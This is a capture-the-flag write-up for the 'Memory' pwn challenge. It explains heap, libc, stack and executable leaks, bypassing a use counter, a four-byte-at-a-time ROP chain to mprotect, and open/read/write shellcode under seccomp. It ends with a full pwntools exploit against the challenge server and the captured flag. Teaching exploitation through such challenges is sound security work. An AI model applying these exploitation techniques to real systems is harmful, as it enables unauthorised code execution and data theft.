# Memory

## Challenge

We're given a glibc and a binary with full mitigations.

Seccomp rules also prohibit all syscalls except the following:

- read
- write
- open
- mprotect

The program presents us with the following menu:

```
Memory can be easily accessed !
1) read
2) write
3) allocate
4) free
5) view
6) exit
>>
```

The read action allows us to read a single 8-byte value from an address of our choosing.

The write action allows us to write a single 4-byte value to an address of our choosing.

We only get a single read OR a single write.
Once we have used either, a variable is incremented and both are unavailable for the remainder of normal program execution.

Allocate allows us to allocate a chunk on the heap with a size and contents of our choosing.
However, the max content length is 8 bytes less than the size we chose.

Free will free the allocated chunk and clear the pointer.

View will print the contents of our allocated chunk, if one exists and is not freed.

Exit will terminate the program.

### Seccomp

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
 0008: 0x15 0x01 0x00 0x0000000a  if (A == mprotect) goto 0010
 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```

## Solution

While the arbitrary write is very powerful, it is useless if we do not know where and what to write.
PIE and ASLR mean we will require a leak to write anywhere useful.
We cannot use the read action to acquire this leak for two reasons:

- we don't know what address to read from
- reading would disable further reads and writes

### First leak (heap)

Before we are allowed to interact with the program, the heap has already had many chunks allocated and freed by the setup functions.
Particularly noticeable are chunks left by the `sandbox` function which sets up seccomp rules, as function pointers to the seccomp library can be found on the heap.

Note that the program does not clear existing data from a chunk when allocating.
This means that we will can reuse a chunk with existing pointers to the heap if we allocate from a bin that has freed chunks from the setup process.

The fact that we overwrite the existing data with our new content is a slight issue here.
At minimum, if we are prompted for data to populate the new chunk, we will overwrite at least the least significant byte of the pointer we want to leak.
We can avoid this by allocating a size of 8, as we will then try to read 0 characters, which will essentially turn the read into a no-op.
This will preserve the heap pointer and allow us to leak it using the view action.

#### Calculating the heap base from a pointer

Here is where I ran into problems with my debugging setup.
While the glibc versions were the same thanks to [Green-Avocado/pwndocker](https://github.com/Green-Avocado/pwndocker), the seccomp library versions were not.
This, and potentially other differences in the environment, meant that my heap was not set up in the same way as the remote, as I had different offsets compared to the remote.

Despite not being able to use my local offsets to find the base of the heap, I was able to find the correct offset of the remote through trial and error.
The leak always ended in `2a0`, so I could be fairly confident that the offset was consistent.

I knew that the last 20 bits of the heap base had to be zeros, and that the base had to be less than the leak I found.
I started by trying to read from an offset of `-0x2a0`, based on the last 20 bits of my leaks.
This succeeded, so I tried increasing the offset to `-0x12a0`, then `-0x22a0` and `-0x32a0`.
The first two succeeded, while `-0x32a0` caused the program to terminate.
From this, we can reason that the program segfaulted because memory at this offset was not mapped.

We have now found that the heap is located at an offset of `-0x22a0` from our leak.

### Unlocking unlimited arbitrary reads and writes

To unlock the potential of the arbitrary reads and writes, we first had to remove the strict limit.

Rather than using a boolean value to store whether or not we had already used one of these actions, this was stored as a signed integer.
The integer started at 0 and incremented every time read or write was used.
Both actions would refuse to run if the integer was not less than 1.

This counter was stored on the heap.
Using our heap leak, if we knew the offset to the counter, we could get the address of the counter and change it to a negative value.

#### Finding the offset to the counter

Again, my heap differed from the remote and I could not use my local offsets.
However, I was able to find the remote offset through trial and error.
This relied on the assumption that the heap set up was consistent on the remote, which fortunately turned out to be correct.

After a write, the read function would print an error message if the counter had not been successfully overwritten.
Using this, I tried many offsets starting from the heap base, until I found a value that did not result in this error message.

Once I had this offset, I could use the arbitrary read and write as much as needed for the remainder of the exploit.

### Side note about interesting allocate behaviour

There is a heap overflow vulnerability in the allocate action.

The program reads 8 less characters than the size.
If we enter a size less than 8, such as 0, the program will still allocate a valid chunk, but the negative value passed to read will be interpreted as a very large positive number.
This allows us to effectively read as many characters as we want into our allocated chunk.
We can use this to overflow our chunk and write into adjacent chunks.

This was an interesting find.
However, while a heap overflow is powerful, I did not find this too useful for this exploit.
The heap overflow did not help with finding the early leaks, and the arbitrary write provided by the program is far more powerful.

### Second leak (libc)

The unlimited reads and writes weren't very useful without other leaks, such as a libc, stack, or exe leak.
Fortunately, recall that there is a libseccomp address on the heap.
This is again at a consistent offset, and can be found by scanning the heap using reads.
The libseccomp address can be identified as it will be clearly outside of the heap, which are the only other pointers present.

#### Calculating the libc base from the libseccomp leak

Once we have found the offset to the libseccomp address, we can read it and use it to calculate the libc address.

Fortunately, libraries are loaded adjacent to eachother.
As libc is loaded first, the lowest address of libseccomp is exactly at the end of the highest address of libc.

Once again, the offset has to be found through trial and error, as I did not know the libseccomp version.
We know the last 20 bits will be 0, similar to the heap leak.
However, we cannot simply read values at intervals of 0x1000 until a segfault, as there are anonymous pages at lower addresses than libc.
Instead, we read values at intervals of 0x1000 until we find one that corresponds with the magic of the libc file, which should be `\x7fELF`
We can also use the known size of libc to ensure that we start our search in libc, avoiding a false positive that might result from finding the start of libseccomp.

### Third leak (stack)

Inside the libc data, there are pointers to the environment variables.
This can be used to get a valid stack address.

In this case, the offset on our local instance is the same as the remote, as the pointer we chose points to the start of the environment variables.
Everything else on the stack before our current stack frame is deterministic and depends on the executable and glibc, both of which are shared by the local and remote.
Thus, no trial and error is required for this offset.

If trial and error was required, we could have used a similar process as the libc leak, where we search the stack from specific values, such as the return address into `main`.

### Fourth leak (exe)

Once we have a stack leak, it is easy to get the exe leak using the arbitrary read.
We can simply read the return address into `main` and calculate the base by subtracting the offset to the correct address.
This is also easy to determine as we have the binary and can disassemble it to find the correct address.

### Ropchain

Writing a ropchain is a bit unusual, as this is done entirely through arbitrary writes of 4 bytes.
We can set up the ropchain in multiple calls, 4 bytes at a time, in a part of the stack that the program does not depend on.
For this, I chose to start the ropchain at RBP in the main loop, as the program would not normally return out of this loop and it was close to the top of the stack.

Once the ropchain is written, we can use a single 4 byte write to change the return address into main with a POP2 gadget.
This gadget is chosen as it will pop 2 values off the stack, then enter our ropchain.
This only requires 4 bytes as we will chose a gadget from the exe to overwrite a return address that originally points at main, meaning we only need to overwrite the lower bytes.

#### Ropchain contents

Since we have `mprotect`, and we have access to libc gadgets including `syscall` gadgets, we can create a RWX page to place and execute shellcode.

For our RWX page, we need a mapped address that we can write to without breaking the program.
Many options exist here, I chose an arbitrary address in libc.

We can set up a ropchain to call `mprotect` on the chosen page and change its permissions to be `RWX`.
We then use a `read` syscall to read our shellcode into this page.
Finally, we return to the start of our writable page, executing our recently placed shellcode.

### Shellcode

With our ropchain in action, we first send our shellcode.

The shellcode is fairly straightforward.
We read a filename into a writeable address, then call `open` to get a handle to this file.
We can then use `read` to store the contents of the file at a writable address, possibly the same address as earlier.
Finally, we use `write` to print the contents of the buffer.

By sending the string `flag.txt`, our shellcode will read the contents of the flag file and print it.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 20.216.39.14 --port 1235 memory
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('memory')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '20.216.39.14'
port = int(args.PORT or 1235)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

libc = ELF('libc.so.6')

io = start()

io.sendlineafter(b">> ", b"3")
io.sendlineafter(b">> ", b"8")
io.recvuntil(b">> ")

io.sendlineafter(b">> ", b"5")
heap = unpack(io.recvuntil(b"\n1) read\n", drop=True).ljust(8, b'\x00')) - 0x22a0
io.info("HEAP: " + hex(heap))

count = heap + 0x2a0
io.sendlineafter(b">> ", b"2")
io.sendlineafter(b">> ", format(count, 'x').encode())
io.sendlineafter(b">> ", b'8' + b'0'*7)

io.sendlineafter(b">> ", b"1")
io.sendlineafter(b">> ", format(heap + 0x320, 'x').encode())
libc.address = int(io.recvline(), 0) - 0x212ca0
io.info("LIBC: " + hex(libc.address))

io.sendlineafter(b">> ", b"1")
io.sendlineafter(b">> ", format(libc.address + 0x1f1190, 'x').encode())
rbp = int(io.recvline(), 0) - 0xf8
io.info("RBP: " + hex(rbp))

io.sendlineafter(b">> ", b"1")
io.sendlineafter(b">> ", format(rbp - 0x18, 'x').encode())
exe.address = int(io.recvline(), 0) - 0x1794
io.info("EXE: " + hex(exe.address))

rwx = libc.address + 0x1eb000

rop = ROP(libc)
rop.mprotect(rwx, 0x2000, 7)
rop.read(0, rwx, 0x1000)
rop.raw(rwx)
print(rop.dump())

chain = rop.chain()
nextqwordaddr = rbp
for qword in [chain[i: i + 4] for i in range(0, len(chain), 4)]:
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b">> ", format(nextqwordaddr, 'x').encode())
    io.sendlineafter(b">> ", format(u32(qword), 'x').encode())
    io.info("wrote to " + hex(nextqwordaddr))
    nextqwordaddr += 0x4

io.sendlineafter(b">> ", b"2")
io.sendlineafter(b">> ", format(rbp - 0x18, 'x').encode())
io.sendlineafter(b">> ", format(ROP(exe).find_gadget(['pop r14', 'pop r15', 'ret'])[0], 'x').encode())

string_addr = rwx + 0x1000

shellcode  = asm(shellcraft.read(0, string_addr, 100))
shellcode += asm(shellcraft.open(string_addr, 0))
shellcode += asm(shellcraft.read('rax', string_addr, 100))
shellcode += asm(shellcraft.write(1, string_addr, 100))

sleep(1)
io.send(shellcode)

sleep(1)
io.send(b"flag.txt")

io.interactive()
```

## Flag

```
Securinets{397b5541d6dacf89123c5a24eea45cb7cc526dade67d4a70}
```
